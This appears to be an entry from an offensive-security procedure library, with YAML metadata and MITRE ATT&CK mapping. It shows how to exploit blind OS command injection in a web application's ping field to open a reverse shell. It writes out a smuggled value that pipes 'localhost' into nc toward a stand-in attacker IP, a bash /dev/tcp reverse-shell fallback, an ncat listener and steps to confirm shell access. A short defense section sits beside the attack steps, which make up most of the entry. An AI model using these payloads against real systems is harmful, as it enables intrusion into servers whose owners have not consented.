---
id: e294ab3c-b314-4725-b328-c149844f14d4
name: Blind-OS-Command-Injection-via-Reverse-Connection
type: procedure
verified: true
submitted: true
created_at: '2020-08-01T17:19:30.894663+00:00'
updated_at: '2023-05-26T18:10:02.756985+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Unix Shell]]'
sub_techniques: []
tags:
  - command-injection
  - blind-injection
  - rce
  - reverse-shell
commands:
  - '[[commands/ncat-listen-on-port]]'
platforms:
  - Web
  - Linux
tools:
  - '[[tools/ncat]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Blind-OS-Command-Injection-via-Reverse-Connection

## Summary

This procedure demonstrates how to exploit a blind OS command injection vulnerability in a web application input field, such as a ping utility, to establish a reverse connection to the attacker's listener. Since the injection is blind (no direct output visible on the page), the payload uses netcat to create an outbound connection, confirming execution and potentially enabling further post-exploitation.

## Description

Blind OS command injection occurs when a web application executes system commands based on user input without proper sanitization, but does not display the command output back to the user. This technique is commonly found in features like ping tools, diagnostic interfaces, or search functions that invoke shell commands. The attacker crafts a payload that chains a benign command (to avoid suspicion) with a reverse shell initiator, directing the target server to connect back to a controlled listener. This allows confirmation of successful injection and can serve as an entry point for command execution. The procedure assumes a Linux-based target server with netcat available and focuses on using ncat for the listener setup. It maps to MITRE ATT&CK technique T1059.004 (Unix Shell) under the Execution tactic.

## Requirements

1. Access to a vulnerable web application with an input field that executes OS commands (e.g., a ping form).
2. Network connectivity from the target server to the attacker's IP (outbound firewall rules permitting).
3. Netcat or ncat installed on the target (common on Linux servers).
4. Attacker machine with ncat for listening.
5. Knowledge of the target's IP reachability for the reverse connection.

## Defense

Defensive measures and detection strategies:

- Input validation and sanitization: Whitelist allowed characters and escape shell metacharacters (e.g., |, &, ;).
- Use parameterized APIs or libraries for command execution instead of direct shell calls (e.g., Python's subprocess with shell=False).
- Web Application Firewall (WAF) rules to block common injection patterns like pipe (|) or nc invocations.
- Application logging: Monitor executed commands and anomalous outbound connections.
- Network segmentation: Restrict outbound connections from web servers to non-standard ports.

## Objectives

1. Confirm blind command injection capability without visible output.
2. Establish a reverse connection to validate execution and enable interactive access.
3. Lay groundwork for further exploitation, such as command execution or shell access.
4. Expected outcome: Successful reverse connection to attacker's listener, indicating RCE achievement.

## Instructions

### Step 1: Identify and Test Vulnerable Input Field

**Context**: Locate the input field susceptible to command injection and verify basic command execution with a visible or expected response to baseline normal behavior. This step confirms the vulnerability exists without triggering alerts.

**Instructions**: Navigate to the vulnerable page (e.g., a ping diagnostic tool). Enter a simple command like "localhost" in the input field and submit. Observe if the application processes it as an OS command (e.g., attempts to ping localhost).

> This step helps differentiate between reflected output and blind execution. If output is visible, the injection may not be fully blind; adjust payload accordingly.

### Step 2: Confirm Blind Nature of Injection

**Context**: Test a command that should produce output but verify no response appears on the page, confirming the blind aspect. This isolates the vulnerability for reverse payload crafting.

**Instructions**: Submit an input that generates expected OS output, such as "127.0.0.1 && ls". Check the page for any displayed results. In a blind scenario, no output will appear despite successful execution on the server.

> Why: Blind injections require out-of-band confirmation; visible output would allow direct exploitation without reverse techniques.

### Step 3: Set Up Attacker Listener

**Context**: Prepare the attacker's side to receive the reverse connection, using ncat to listen on a specified port. This captures the inbound connection from the injected payload.

**Command** ([[commands/ncat-listen-on-port]]):
```bash
ncat -lvp $_PORT
```

> Execute this on the attacker's machine before injecting the payload. Replace $_PORT with a high port like 9999 to avoid common blocks. Expected: Listener starts without errors, showing "Listening on 0.0.0.0:$_PORT".

### Step 4: Craft and Inject Reverse Connection Payload

**Context**: Construct a payload that chains a benign command with netcat to initiate a reverse TCP connection. Submit it to the vulnerable field to trigger the outbound connection.

**Instructions**: Enter the payload in the format: "localhost | nc $_ATTACKER_IP $_PORT". Submit the form. The pipe (|) chains the commands, executing the netcat reverse connection silently.

> Why: The "localhost" maintains normal behavior if partially logged, while "nc" establishes the connection. Use your attacker's IP and the listener port. Decision point: If nc is unavailable on target, fallback to other tools like bash reverse shell (e.g., "bash -i >& /dev/tcp/$_ATTACKER_IP/$_PORT 0>&1").

### Step 5: Verify Connection and Interact

**Context**: Monitor the listener for the incoming connection, confirming successful injection and enabling basic interaction.

**Instructions**: Observe the ncat output for a new connection from the target's IP. If connected, send test commands (e.g., "whoami") to verify shell access.

> Success criteria: Connection established; commands execute on target. If no connection, check firewall, IP reachability, or try alternative payloads.

## Expected Output

- Step 1/2: No visible errors or output on the web page for blind tests.
- Step 3: ncat listener: "Ncat: Listening on :::$_PORT" and "Ncat: Listening on 0.0.0.0:$_PORT".
- Step 4/5: Upon injection, ncat shows: "Ncat: Connection from [target IP]." Interactive shell prompts appear for command input.

---

*Last updated: 2023-05-26T18:10:02.756985+00:00*
